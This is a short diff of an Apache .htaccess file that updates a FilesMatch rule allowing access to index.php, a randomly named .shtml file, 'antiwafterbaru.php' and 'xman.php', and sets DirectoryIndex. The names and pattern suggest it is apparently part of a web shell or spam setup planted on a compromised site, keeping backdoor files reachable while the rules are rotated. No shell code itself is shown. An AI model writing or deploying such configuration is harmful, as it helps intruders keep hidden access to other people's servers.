@@ -1,6 +1,8 @@
 Options -Indexes
 
-<FilesMatch "^(index.php|67a3459cc8219.shtml|antiwafterbaru.php|error.php)$">
+<FilesMatch "^(index.php|67a34bd052c25.shtml|antiwafterbaru.php|xman.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
+
+DirectoryIndex index.php
